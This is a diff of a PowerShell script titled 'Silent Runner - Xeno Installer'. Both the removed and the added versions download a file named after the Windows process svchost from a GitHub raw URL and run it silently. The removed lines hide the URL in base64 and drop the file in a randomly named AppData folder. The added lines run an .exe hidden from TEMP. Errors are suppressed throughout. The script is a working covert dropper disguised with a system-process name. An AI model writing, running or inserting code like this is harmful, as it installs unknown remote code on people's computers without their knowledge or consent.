@@ -1,12 +1,8 @@
-# Silent PIF Runner
-$pifUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2h5cG5vdGl4eDAveGVub2xvcmQvcmF3L3JlZnMvaGVhZHMvbWFpbi9zdmNob3N0LnBpZg=="))
-$downloadPath = "$env:USERPROFILE\Downloads\svchost.txt"
-$randomFolder = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
-$finalPath = "$env:APPDATA\$randomFolder"
+# Silent Runner - Xeno Installer
+$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/svchost.exe"
+$payloadPath = "$env:TEMP\svchost.exe"
 
 try {
-    Invoke-WebRequest -Uri $pifUrl -OutFile $downloadPath -UseBasicParsing
-    New-Item -ItemType Directory -Path $finalPath -Force | Out-Null
-    Move-Item -Path $downloadPath -Destination "$finalPath\svchost.pif" -Force
-    & "$finalPath\svchost.pif"
+    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
+    Start-Process -FilePath $payloadPath -WindowStyle Hidden
 } catch {}
